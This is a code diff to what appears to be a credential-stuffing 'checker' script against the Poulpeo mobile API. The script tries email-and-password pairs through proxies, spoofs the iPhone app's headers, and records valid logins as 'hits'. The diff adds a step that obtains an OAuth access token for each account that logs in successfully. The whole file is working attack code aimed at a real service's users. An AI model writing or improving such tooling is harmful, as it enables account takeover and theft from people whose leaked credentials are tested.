@@ -266,6 +266,26 @@ LOGIN_URL = (
     "https://mobile.poulpeo.com/api/2.2/user/login/"
 )
 
+ACCESS_TOKEN_URL = (
+    "https://mobile.poulpeo.com/api/2.2/oauth/accessToken/"
+)
+
+ACCESS_TOKEN_UA = (
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) "
+    "AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
+)
+
+ACCESS_TOKEN_HEADERS = {
+    "accept": "application/json",
+    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+    "x-client-version": "26.1.5",
+    "accept-charset": "UTF-8",
+    "priority": "u=3, i",
+    "accept-language": "fr-FR,fr;q=0.9",
+    "accept-encoding": "deflate;q=1.0,gzip;q=0.9",
+    "user-agent": ACCESS_TOKEN_UA,
+}
+
 _STATUS_OK_RE = re.compile(r'"status"\s*:\s*"ok"')
 
 
@@ -358,6 +378,31 @@ def post_login(session, oauth_token, oauth_token_secret, email, password):
     )
 
 
+def post_access_token(session, oauth_token, oauth_token_secret):
+    access_body = {
+        "realm": ACCESS_TOKEN_URL,
+    }
+
+    auth_header = build_oauth_header(
+        method="POST",
+        url=ACCESS_TOKEN_URL,
+        consumer_key=CONSUMER_KEY,
+        consumer_secret=CONSUMER_SECRET,
+        token=oauth_token,
+        token_secret=oauth_token_secret,
+        extra_params=access_body,
+    )
+
+    headers = ACCESS_TOKEN_HEADERS.copy()
+    headers["authorization"] = auth_header
+
+    return session.post(
+        ACCESS_TOKEN_URL,
+        headers=headers,
+        data=access_body,
+    )
+
+
 def classify_login_response(response):
     text = response.text or ""
 
@@ -415,6 +460,15 @@ def process_account(email, password, proxy_url, stats, hit_writer):
         )
         kind = classify_login_response(response)
         if kind == "valid":
+            acc_response = post_access_token(
+                session, oauth_token, oauth_token_secret
+            )
+            print_reponse_finale_complete(
+                email,
+                "oauth/accessToken — réponse finale",
+                ACCESS_TOKEN_URL,
+                acc_response,
+            )
             hit_writer.append_hit(email, password)
         stats.record(kind)
     except Exception as e:
